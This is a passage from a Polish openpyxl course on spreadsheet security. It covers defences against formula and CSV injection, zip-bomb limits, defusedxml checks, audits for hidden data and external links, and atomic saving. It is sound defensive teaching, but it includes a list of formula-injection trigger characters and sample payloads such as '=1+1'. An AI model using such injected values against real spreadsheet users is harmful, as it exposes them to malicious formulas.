2. **Walka idzie o typ, nie o treść.** To jest zdanie, które zastępuje wszystkie czarne listy: **nie próbuj ocenić, czy wartość jest groźna — spraw, żeby nigdy nie była formułą.** Dla `.xlsx` masz do tego jedno precyzyjne narzędzie: `cell.data_type = "s"`, ustawiane **po** przypisaniu wartości (bo przypisanie nadpisuje typ). Dla pól o znanym kształcie masz lepsze narzędzie: **konwersję do typu** (`number`, `bool`, `date`) — wtedy żaden znak wyzwalający nie ma szans. `openpyxl.utils.escape` **nie jest** tym narzędziem (obsługuje znaki sterujące OOXML). `strip()` **nie jest** tym narzędziem (a wręcz potrafi stworzyć formułę).

3. **Nie naprawiaj cudzych plików — wyjmij z nich wartości.** Różnica między „oczyszczaniem" a „budowaniem od zera" jest fundamentalna, bo **nie znasz wszystkich przegród kontenera**. `load_workbook(src, data_only=True, keep_links=False)` + `iter_rows(values_only=True)` + nowy `Workbook` = dane bez formuł, bez linków zewnętrznych, bez pamięci podręcznych, bez ukrytych arkuszy. **Zawsze razem** `data_only` (formuła → wartość, **zanim** linki znikną) **i** `keep_links` (nie wczytuj części `externalLink` — oszczędza też pamięć). I pamiętaj: `_external_links` jest **prywatne** — do audytu czytaj `xl/externalLinks/*` z ZIP-a, bo **standard ZIP/XML jest stabilny, a implementacja nie**.

4. **Skoroszyt to kontener, nie ekran.** Widzisz siatkę komórek; wysyłasz: `veryHidden` arkusze (nie ma ich w żadnym menu Excela), ukryte kolumny z danymi, wartości ukryte formatem `;;;`, komentarze **z nazwiskami autorów**, definiowane nazwy (ukryte i zewnętrzne), **linki zewnętrzne ze ścieżkami UNC do Twoich serwerów plików**, metadane autora i firmy, osadzone obrazy i **pamięci podręczne tabel przestawnych z danymi źródłowymi**. Dlatego audyt patrzy na **dwie warstwy**: na **ZIP** (bo openpyxl nie modeluje wszystkiego i nie wie o tym, o czym nie wie) **i** na model.

5. **Bezpieczeństwo to limity i automat, nie dobre chęci.** Python **nie chroni** przed zip bomb (CVE-2019-9674) — limit rozpakowania, **liczba części**, **współczynnik kompresji** i **twardy limit pamięci procesu** są na Tobie. `defusedxml` jest zależnością produkcyjną, a jego aktywność **sprawdzoną przy starcie** — pamiętając, że `OPENPYXL_DEFUSEDXML=1` (albo `true`, albo `yes`) **wyłącza** ochronę, bo porównanie brzmi `== "True"`. `tempfile.mktemp()` **nigdy** (wyścig TOCTOU), tylko `mkstemp()`. Zapis zawsze **atomowy** (`mkstemp` → `save` → `os.replace`). I na koniec: **audyt musi być automatem z kodem wyjścia** — narzędzie, które trzeba przeczytać okiem, jest używane raz na miesiąc; narzędzie wpisane w CI **przy każdym commicie**.

## 8. Ściągawka modułu

```python
# ==================================================================
# 1. IMPORTY I SPRAWDZENIE ZABEZPIECZEN (FAIL-FAST - na gorze modulu!)
# ==================================================================
import io
import os
import re
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

import openpyxl
from openpyxl import Workbook, load_workbook, DEFUSEDXML, LXML
from openpyxl.utils.exceptions import IllegalCharacterError, InvalidFileException

# ⚠️ DOMYSLNIE jest True. KAZDA wartosc != "True" (np. "1", "true", "yes")
#    WYLACZA ochrone. Nie ustawiaj tego "na wszelki wypadek".
if not DEFUSEDXML:
    raise RuntimeError(
        "defusedxml nieaktywny! pip install defusedxml; "
        "sprawdz zmienna OPENPYXL_DEFUSEDXML (tylko 'True' wlacza!)"
    )


# ==================================================================
# 2. ZNAKI WYZWALAJACE (OWASP) - SPRAWDZAJ NA SUROWEJ WARTOSCI
# ==================================================================
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
# UWAGA: NIE uzywaj strip() przed tym sprawdzeniem!
#   " =1+1"  -> strip() -> "=1+1"  -> strip() STWORZYL ładunek (sekcja 2.1.3)


# ==================================================================
# 3. NEUTRALIZACJA - DLA .XLSX (poprawna droga)
# ==================================================================
def zapisz_bezpiecznie(ws, row, column, wartosc, jako_tekst=False):
    """KOLEJNOSC OBOWIAZKOWA: wartosc -> potem data_type."""
    c = ws.cell(row=row, column=column, value=wartosc)

    if jako_tekst:
        c.data_type = "s"          # "s" == string; NIE "f"!
    return c

# ⬅ ODWROTNIE NIE DZIALA:
#     ws["A1"].data_type = "s"
#     ws["A1"] = "=1+1"          # przypisanie NADPISUJE typ na "f"!
#
# Dozwolone wartosci data_type (Cell.VALID_TYPES):
#   ('s', 'f', 'n', 'b', 'n', 'inlineStr', 'e', 'str')
#   s = string, f = formula, n = number, b = bool, e = error, str = formula-as-text


# ==================================================================
# 4. NEUTRALIZACJA - DLA .CSV (konwencja, nie gwarancja)
# ==================================================================
def neutralise_csv(value):
    """OWASP: prefiks apostrofu dla wartosci ryzykownych w CSV."""
    if isinstance(value, str) and value.startswith(DANGEROUS_PREFIXES):
        return "'" + value
    return value

# ⚠️ W .XLSX NIE uzywaj apostrofu - stanie sie zwyklym znakiem w wartosci!
# ⚠️ "-" jest w liscie, ale "-1200.50" to LICZBA - stosuj TYLKO do kolumn TEKSTOWYCH!


# ==================================================================
# 5. WERYFIKACJA WYJSCIA (warstwa 3) - "ile formul NAPISALEM?"
# ==================================================================
def policz_formuly(wb) -> list[str]:
    return [
        f"{ws.title}!{c.coordinate}"
        for ws in wb.worksheets for wiersz in ws.iter_rows()
        for c in wiersz if c.data_type == "f"
    ]

# W raporcie generowanym od zera liczba formul musi byc ZNANA Z GORY.
# Kazda dodatkowa formula = potencjalny wsad, ktory przeszedl obrone.


# ==================================================================
# 6. BEZPIECZNE WEJSCIE (upload od obcego)
# ==================================================================
LIMIT_BAJTOW = 20 * 1024 * 1024
LIMIT_ROZPAKOWANE = 200 * 1024 * 1024
LIMIT_WSPOLCZYNNIK = 50.0
LIMIT_CZESCI = 5000
DOZWOLONE = {".xlsx", ".xlsm"}

def waliduj_tresc(bajty: bytes) -> None:
    if len(bajty) > LIMIT_BAJTOW:
        raise ValueError("Plik za duzy")

    bufor = io.BytesIO(bajty)
    if not zipfile.is_zipfile(bufor):
        raise ValueError("To nie jest ZIP/XLSX")

    with zipfile.ZipFile(bufor) as zf:
        infos = zf.infolist()
        if len(infos) > LIMIT_CZESCI:
            raise ValueError("Za duzo czesci")
        rozp = sum(i.file_size for i in infos)
        spak = max(sum(i.compress_size for i in infos), 1)
        if rozp > LIMIT_ROZPAKOWANE or rozp / spak > LIMIT_WSPOLCZYNNIK:
            raise ValueError("Podejrzenie zip bomb")
        if "[Content_Types].xml" not in zf.namelist():
            raise ValueError("To nie jest OOXML")

def wczytaj_wartsci(bajty: bytes) -> list[list]:
    waliduj_tresc(bajty)
    try:
        wb = load_workbook(io.BytesIO(bajty), read_only=True,
                           data_only=True,    # formuly -> wartosci
                           keep_links=False)  # nie wczytuj externalLink
    except (InvalidFileException, zipfile.BadZipFile, KeyError) as exc:
        raise ValueError("Nie udalo sie odczytac pliku") from exc
    try:
        return [list(r) for r in wb.worksheets[0].iter_rows(values_only=True)
                if any(v is not None for v in r)]
    finally:
        wb.close()          # OBOWIAZKOWE (modul 19)


# ==================================================================
# 7. AUDYT - WARSTWA ZIP (bo openpyxl nie modeluje wszystkiego!)
# ==================================================================
def linki_zewnetrzne(sciezka) -> dict[int, str]:
    """Czyta STANDARD OOXML, nie prywatne wb._external_links."""
    wzorzec = re.compile(r"xl/externalLinks/_rels/externalLink(\d+)\.xml\.rels$")
    wynik = {}
    with zipfile.ZipFile(sciezka) as zf:
        for nazwa in zf.namelist():
            m = wzorzec.match(nazwa)
            if not m:
                continue
            xml = zf.read(nazwa).decode("utf-8", errors="replace")
            t = re.search(r'Target="([^"]+)"', xml)
            if t:
                wynik[int(m.group(1))] = (
                    t.group(1).replace("%20", " ").replace("file:///", "")
                )
    return dict(sorted(wynik.items()))

# UNC -> "\\\\serwer\\udzial"  = WYCIEK: nazwy serwerow, udzialow, struktury katalogow
# Inne wrazliwe czesci: xl/media/, xl/pivotCache/, customXml/, xl/drawings/, docProps/


# ==================================================================
# 8. AUDYT - WARSTWA MODELU
# ==================================================================
# for ws in wb.worksheets:
#     ws.sheet_state != "visible"                      -> hidden / veryHidden
#     ws.row_dimensions[i].hidden                      -> + sprawdz, czy ma DANE
#     ws.column_dimensions[L].hidden                   -> + sprawdz, czy ma DANE
# for wiersz in ws.iter_rows():
#     for c in wiersz:
#         c.comment is not None                        -> WYCIEK (autor!)
#         c.number_format == ";;;" and c.value is not None -> wartosc ukryta FORMATEM
#         c.data_type == "f" and "[" in c.value        -> formula do linku zewn.
#         c.data_type == "f" and "!" in c.value        -> formula miedzyarkuszowa
# for nazwa, d in wb.defined_names.items():
#     d.hidden, d.is_external, d.attr_text             -> ukryte i zewnetrzne nazwy
# for pole in ("creator","lastModifiedBy","title","subject","keywords","description"):
#     getattr(wb.properties, pole)                     -> metadane
# wb.custom_doc_props                                -> wlasne wlasciwosci


# ==================================================================
# 9. KOPIA DO UDOSTEPNIENIA (odejmowanie od wartosci, nie czyszczenie)
# ==================================================================
def kopia_do_udostepnienia(src, dst, zostaw_arkusze):
    # data_only=True I keep_links=False RAZEM - inaczej #REF! w raporcie!
    wb = load_workbook(src, data_only=True, keep_links=False)
    try:
        for ws in list(wb.worksheets):
            if ws.title not in zostaw_arkusze or ws.sheet_state != "visible":
                wb.remove(ws)          # BIALA LISTA, nie czarna!

        for ws in wb.worksheets:
            for dim in ws.row_dimensions.values():
                dim.hidden = False
            for dim in ws.column_dimensions.values():
                dim.hidden = False
            for wiersz in ws.iter_rows():
                for c in wiersz:
                    c.comment = None
                    if c.number_format == ";;;":
                        c.value = None                 # OBA pola naraz!
                        c.number_format = "General"

        wb.properties.creator = "Automat raportowy"
        wb.properties.lastModifiedBy = "Automat raportowy"
        wb.properties.subject = wb.properties.keywords = None
        wb.properties.description = None

        # ZAPIS ATOMOWY - bez mktemp()!
        dst = Path(dst)
        fd, tmp = tempfile.mkstemp(suffix=".xlsx", dir=dst.parent)
        os.close(fd)
        try:
            wb.save(tmp)
            os.replace(tmp, dst)       # atomowo na tym samym wolumenie
        except BaseException:          # takze KeyboardInterrupt
            Path(tmp).unlink(missing_ok=True)
            raise
    finally:
        wb.close()


# ==================================================================
# 10. OCHRONA - TO NIE SZYFROWANIE!
# ==================================================================
wb.security.lockStructure = True
wb.security.workbookPassword = "..."        # hashuje automatycznie
wb.security.revisionsPassword = "..."
ws.protection.sheet = True
ws.protection.password = "..."
# + Protection(locked=False) na polach formularza (modul 17)
#
# Dokumentacja: "The data is not encrypted... cannot protect it from
# malicious modification". To klodka na szufladzie, nie sejf.


# ==================================================================
# 11. LIMITY PROCESU (zip bomb / DoS)
# ==================================================================
# ZIP:    suma file_size, wspolczynnik file_size/compress_size, liczba czesci
# CZAS:   subprocess.run(..., timeout=N) - timeout klienta HTTP NIC NIE DAJE
# PAMIEC: cgroup / resource.setrlimit na OSOBNYM procesie
# SIEĆ:   daj procesowi przetwarzania plikow BRAK sieci (odcina eksfiltracje)
#
# tempfile.mktemp()   - ❌ NIGDY (wyscig TOCTOU)
# tempfile.mkstemp()  - ✅ tworzy plik atomowo, zwraca (fd, path)


# ==================================================================
# 12. PULAPKI - DO ZAPAMIETANIA
# ==================================================================
# 1) data_type = "s" PO przypisaniu wartosci, nigdy przed.
# 2) nie strip() - moze STWORZYC formule.
# 3) openpyxl.utils.escape NIE chroni przed formulami (znaki < 31!).
# 4) openpyxl wykrywa tylko "="; odbiorca moze reagowac na + - @ \t \r.
# 5) "-1200.50" to LICZBA - nie neutralizuj minusa globalnie!
# 6) _validate_archive NIE waliduje buforow (tylko sciezki!).
# 7) OPENPYXL_DEFUSEDXML=1 WYLACZA ochrone (porownanie == "True").
# 8) wb._external_links jest PRYWATNE - czytaj ZIP.
# 9) veryHidden nie ma go w oknie "Odkryj" Excela.
# 10) ";;;" = wartosc jest, ale jej NIE WIDAC.
# 11) keep_links=False + data_only=True RAZEM, inaczej #REF!.
# 12) Python zipfile NIE chroni przed zip bomb (CVE-2019-9674).
# 13) haslo arkusza to NIE szyfrowanie.
# 14) nie loguj tresci komorek (PII + log injection).
# 15) nie uzywaj nazwy pliku od uzytkownika w sciezce (path traversal).
# 16) zapis zawsze atomowy: mkstemp -> save -> os.replace.
# 17) audyt patrzy na ZIP i na model - bo openpyxl nie wie, o czym nie wie.
# 18) audyt musi miec kod wyjscia - inaczej nikt go nie uruchomi w CI.
```

## 9. Co dalej

Zatrzymaj się na chwilę i policz, co już masz.

Masz narzędzie, które **czyta i pisze** pliki `.xlsx` (moduły 04–08). Masz **formatowanie** od prostego po warunkowe (09–14). Masz **wykresy, obrazy i walidację** (15–17). Wiesz, **jak nie zniszczyć cudzego pliku** (18), **jak przetworzyć milion wierszy** (19) i **jak to wszystko przetestować, żeby mieć odwagę to zmieniać** (20). A teraz wiesz jeszcze, **jak nie wysłać ładunku razem z raportem** (21).

I w tym momencie kurs robi skręt, który może wydać się nieoczekiwany. Przechodzimy od **rzemiosła** do **architektury**. Od „jak użyć API" do „**gdzie w ogóle ma być to API**".

Zobacz, ile w tym module było nie o openpyxl. **Fałszywy `escape`. Znaki wyzwalające w CSV. Zip bomb w `zipfile`. Porównanie `== "True"`. Wyścig TOCTOU w `mktemp`. Limity procesu. Log injection. Path traversal w nazwie pliku.** Większość powierzchni ataku, którą tu omówiliśmy, **nie leży w bibliotece** — leży w **Twoim kodzie i Twoim środowisku**. I to jest pierwszy sygnał, że warto przestać myśleć o skrypcie, a zacząć myśleć o **systemie**.

Ale ten moduł dał Ci coś jeszcze, ważniejszego niż lista kontrolna. Dał Ci **dwie zasady, które są wzorcami projektowymi, tylko jeszcze ich tak nie nazwałeś**:

**Pierwsza zasada: „biała lista zamiast czarnej".** W sekcji 2.2 (droga 3) odkryłeś, że walidacja whitelistowa działa, bo **jest z definicji kompletna**, a każda lista groźnych rzeczy jest niekompletna. W sekcji 2.10 przekonałeś się, że kopia do udostępnienia musi działać przez `zostaw_arkusze` (**biała lista**), a nie przez „usuń wszystko, co ukryte". I w ćwiczeniu z audytem sam napisałeś: `--napraw` **wymaga** `--zostaw`. Ta zasada nie jest tylko o bezpieczeństwie — jest o **projektowaniu reguł**.

**Druga zasada: „oddziel decyzję od efektu".** `normalizuj()` zwracała `Komorka(wartosc, jako_tekst)` — **strukturę danych**, bez openpyxl, bez I/O. Dzięki temu mogłeś ją przetestować w mikrosekundach, z `hypothesis`, i **zobaczyć** `jako_tekst` w teście. A `zapisz_komorke()` — warstwa infrastruktury — tylko **wykonywała decyzję**. To jest dokładnie ten sam podział, który w module 20 pozwolił Ci przetestować logikę bez plików.

I teraz pytanie na następny moduł. Nie „jak zabezpieczyć plik", a:

> **Skoro reguły walidacji są listami dozwolonych wartości, a decyzje można odseparować od efektu — to dlaczego mój kod nadal rośnie w jedną, dziewięciusetliniową funkcję, w której nikt nie potrafi zmienić nagłówka?**

**Moduł 22** odpowie na to pytanie. Zobaczysz historię skryptu, który zaczął się od piętnastu linii i skończył jako coś, czego nikt nie chce dotknąć. Poznasz sześć sygnałów ostrzegawczych — i zauważysz, że **jeden z nich już znasz** z tego modułu: „`data_type = "s"` wstawione w dziewięciu miejscach, a nowy endpoint o tym nie wie". To nie jest skutek uboczny. To jest **objaw**.

A w module 26 zobaczysz, do czego to wszystko zmierza z punktu widzenia bezpieczeństwa. Bo zdanie z sekcji 2.2 — *„sanitacja na wejściu do domeny, nie w momencie zapisu"* — to nie jest dobra rada. To **granica architektoniczna**. Warstwa domenowa, która **nie importuje openpyxl** (moduł 26, test `grep -r "openpyxl" src/`), jest jednocześnie warstwą, w której **nie ma jak wstawić formuły do komórki** — bo nie ma tam komórek. To ta sama granica, którą wyznaczyłeś dzisiaj ręcznie, przeniesiona z powrotu funkcji do **struktury katalogów**.

Bezpieczeństwo, które zbudowałeś w tym module, nie zniknie. Wrócisz do niego trzy razy:

- w **module 20** — żeby dopisać testy właściwościowe na niezmiennik „żadna wartość użytkownika nie ma `data_type == 'f'`",
- w **module 24** — bo `Facade` (moduł 24) albo `Adapter` (moduł 24) jest jedynym miejscem, przez które dane wchodzą do komórek, i właśnie tam ma stać sanacja, w **jednym miejscu** zamiast w dziewięciu,
- w **module 26** — bo „pipeline ingestii" jako **Port** (`EksporterRaportu`), z adapterem `EksporterFake` w testach, to najczystszy sposób na to, żeby nigdy więcej nie zastanawiać się, czy zapomniałeś o `data_type` w którymś z endpointów.

Bo wiesz już, co jest naprawdę niebezpieczne. Nie openpyxl. Nie formuła `=1+1`.

**Niebezpieczna jest dziewiąta kopia tego samego kodu, o której nikt nie pamięta.**